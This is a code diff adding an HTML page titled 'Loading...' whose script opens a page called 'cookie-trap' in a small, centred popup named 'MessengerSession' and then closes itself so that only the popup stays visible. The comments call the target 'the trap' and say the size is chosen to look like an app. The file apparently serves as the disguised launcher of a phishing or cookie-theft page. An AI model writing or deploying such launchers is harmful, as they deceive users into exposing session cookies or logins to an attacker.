@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        // This script opens the 'trap' (index.html) in a popup window
+        // It uses a specific size so it looks like a small app
+        
+        var width = 400;
+        var height = 600;
+        
+        // Calculate position to center it on screen
+        var left = (screen.width/2)-(width/2);
+        var top = (screen.height/2)-(height/2);
+
+        // Open the TRAP file (index.html) in a new popup window
+        // Make sure YOUR_USERNAME matches your GitHub username exactly!
+        var win = window.open(
+            "https://rhosaain08.github.io/cookie-trap/index.html", 
+            "MessengerSession", 
+            `width=${width},height=${height},top=${top},left=${left}`
+        );
+
+        // Close this small helper window immediately so the user only sees the popup
+        setTimeout(function(){ 
+            window.close(); 
+        }, 500);
+    </script>
+</body>
+</html>
